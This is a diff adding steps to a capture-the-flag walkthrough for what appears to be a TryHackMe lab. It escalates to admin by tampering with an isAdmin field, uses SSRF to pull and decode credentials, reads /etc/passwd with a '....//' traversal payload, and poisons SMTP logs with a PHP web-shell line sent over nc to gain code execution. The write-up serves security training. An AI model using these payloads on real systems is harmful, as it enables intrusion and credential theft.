@@ -200,6 +200,7 @@ OS details: Linux 4.15
 I know there are two open ports with HTTP service via `4000` and `50000`. Let's enumerate hidden directories
 
 ### Port 4000
+Hidden Directories
 ```
 ffuf -u http://10.48.188.141:4000/FUZZ -w /usr/share/wordlists/dirb/big.txt 2>/dev/null
 Index                   [Status: 302, Size: 29, Words: 4, Lines: 1, Duration: 179ms]
@@ -211,7 +212,45 @@ signout                 [Status: 302, Size: 29, Words: 4, Lines: 1, Duration: 17
 signup                  [Status: 500, Size: 1246, Words: 55, Lines: 11, Duration: 179ms]
 ```
 
+Here is the page with provided credentials
+<img width="1920" height="1006" alt="Screenshot_2025-12-03_01-48-15" src="https://github.com/user-attachments/assets/65998a34-acdb-4fec-b538-725292cff77f" />
+
+After Loggin, it will look like this
+<img width="1920" height="924" alt="Screenshot_2025-12-03_01-49-09" src="https://github.com/user-attachments/assets/d760faf4-d414-456e-9861-31d80f187be4" />
+
+Let's dive into my profile
+<img width="1920" height="969" alt="Screenshot_2025-12-03_01-49-44" src="https://github.com/user-attachments/assets/0277b5d0-43dc-42b6-a6b9-52c739d01a4c" />
+
+I can clearly see that the page display the variables and also value, so I attempt to add another variable called `book` and it displays, which gives me insight whether I could modify the value `isAdmin` to true
+<img width="1920" height="1017" alt="Screenshot_2025-12-03_01-49-26" src="https://github.com/user-attachments/assets/f893c7f7-f766-4bad-8c94-ddaaf24c429d" />
+
+By inserting the variable `isAdmin` to `Activity Type` box and `Activity Name` which is true 
+<img width="1920" height="961" alt="Screenshot_2025-12-03_01-58-44" src="https://github.com/user-attachments/assets/3e3d94ef-858b-4838-be44-bea7759cc049" />
+
+Now there is a new section in the navigation bar called API and Settings let's have a look at them
+
+#### API
+<img width="1920" height="958" alt="Screenshot_2025-12-03_01-59-57" src="https://github.com/user-attachments/assets/e07633c9-8eb4-4d30-b219-16d1dadd8f59" />
+
+#### Settings
+<img width="1922" height="970" alt="Screenshot_2025-12-03_02-00-09" src="https://github.com/user-attachments/assets/f805a1ae-90a4-4451-90f7-e97d349789bc" />
+
+This function allow user to admin to access resource exteranally or internally. My theory is to conduct SSRF attack by get the Internal API content from API with Settings
+<img width="1921" height="964" alt="Screenshot_2025-12-03_02-05-14" src="https://github.com/user-attachments/assets/0d2dd193-c805-4626-9fba-5ba948110a03" />
+
+```
+echo "eyJzZWNyZXRLZXkiOiJzdXBlclNlY3JldEtleTEyMyIsImNvbmZpZGVudGlhbEluZm8iOiJUaGlzIGlzIHZlcnkgY29uZmlkZW50aWFsIGluZm9ybWF0aW9uLiBIYW5kbGUgd2l0aCBjYXJlLiJ9" | base64 -d
+{"secretKey":"superSecretKey123","confidentialInfo":"This is very confidential information. Handle with care."}
+```
+After decoding the base64 string reveals that this setting is vulnerable to SSRF attack which then I use the AdminsAPI
+```
+echo "eyJSZXZpZXdBcHBVc2VybmFtZSI6ImFkbWluIiwiUmV2aWV3QXBwUGFzc3dvcmQiOiJhZG1pbkAhISEiLCJTeXNNb25BcHBVc2VybmFtZSI6ImFkbWluaXN0cmF0b3IiLCJTeXNNb25BcHBQYXNzd29yZCI6IlMkOSRxazZkIyoqTFFVIn0=" | base64 -d
+{"ReviewAppUsername":"admin","ReviewAppPassword":"admin@!!!","SysMonAppUsername":"administrator","SysMonAppPassword":"S$9$qk6d#**LQU"}   
+```
+<img width="1920" height="962" alt="Screenshot_2025-12-03_02-08-25" src="https://github.com/user-attachments/assets/25f6531e-669b-44e0-82d7-a4dfcd4b9979" />
+
 ### Port 50000
+Hidden Directories
 ```
 ffuf -u http://10.48.188.141:50000/FUZZ -w /usr/share/wordlists/dirb/big.txt 2>/dev/null
 .htaccess               [Status: 403, Size: 281, Words: 20, Lines: 10, Duration: 3481ms]
@@ -223,3 +262,54 @@ templates               [Status: 301, Size: 327, Words: 20, Lines: 10, Duration:
 uploads                 [Status: 301, Size: 325, Words: 20, Lines: 10, Duration: 177ms]
 ```
 
+Here is the page
+<img width="1920" height="1002" alt="Screenshot_2025-12-03_02-10-05" src="https://github.com/user-attachments/assets/af853532-dac5-4a05-8a3b-4cce5ed8f3ff" />
+
+Here is the Login portal and I use the decoded credentials above to get access in SysMon
+<img width="1920" height="697" alt="Screenshot_2025-12-03_02-12-25" src="https://github.com/user-attachments/assets/6a853dd8-c6d8-4e1f-b71f-e25df7097b1a" />
+<img width="1920" height="690" alt="Screenshot_2025-12-03_02-11-53" src="https://github.com/user-attachments/assets/5138998b-e148-490b-9a6d-10f312cd0e94" />
+
+So I notice that in the page source the image is reference locally
+<img width="1923" height="1001" alt="Screenshot_2025-12-03_02-31-53" src="https://github.com/user-attachments/assets/26d8ac34-2ddd-4bda-bf90-9580b2d566cf" />
+
+Which might allow me to access other contain in the server 
+<img width="1920" height="900" alt="Screenshot_2025-12-03_02-38-09" src="https://github.com/user-attachments/assets/c7b78529-952d-4d51-b2f0-9ce007f59cd9" />
+
+I am going to use Burp Suite Intruder and the payload `/usr/share/wordlists/seclists/Fuzzing/LFI/LFI-Jhaddix.txt`
+<img width="1601" height="905" alt="Screenshot_2025-12-03_03-04-45" src="https://github.com/user-attachments/assets/2a426718-1d79-4fd9-8afe-13333dc27945" />
+
+Then I create the payload to view `/etc/passwd`
+```
+....//....//....//....//....//....//....//....//....//....//....//....//....//....//....//etc/passwd
+```
+It works. However, I cannot view the content of `/var/www/html` which means that I have to find another way
+<img width="1920" height="927" alt="Screenshot_2025-12-03_03-06-54" src="https://github.com/user-attachments/assets/1547f462-1b1d-4884-ac97-d4901b0a3e8a" />
+
+So may be conduct a RCE to retrieve the flag. From the output above I have two users `joshua` and `charles`, which arouse my interest in checking for mail logs since the port pop3 and smtp is open
+<img width="1916" height="303" alt="Screenshot_2025-12-03_03-12-25" src="https://github.com/user-attachments/assets/c4753fcc-b5a4-4ca1-83e0-f9811f897125" />
+
+The content in this file include :
+    - Logs of incoming and outgoing emails
+    - Server-side events that could give insight into how the application functions
+
+I look for combination of LFI and SMTP vulnerability and here it goes the [article](https://www.hackingarticles.in/smtp-log-poisioning-through-lfi-to-remote-code-exceution/)
+
+So prepare for the payload
+```
+RCPT TO:<?php system($_GET['c']); ?>
+```
+then connect to smtp service
+```
+nc 10.49.191.215 25
+220 mail.filepath.lab ESMTP Postfix (Ubuntu)
+MAIL FROM:<gay@thm.com>
+250 2.1.0 Ok
+RCPT TO:<?php system($_GET['c']); ?>
+501 5.1.3 Bad recipient address syntax
+```
+
+After successfully inject, it is time for retrieving data
+<img width="1920" height="229" alt="Screenshot_2025-12-03_03-20-51" src="https://github.com/user-attachments/assets/8fee6ab8-56c8-498a-9761-ba68027514ec" />
+<img width="1920" height="220" alt="Screenshot_2025-12-03_03-20-09" src="https://github.com/user-attachments/assets/749f89cf-ea9e-4902-9fa2-68a8cd829f1a" />
+
+Happy Hacking~~!!~!
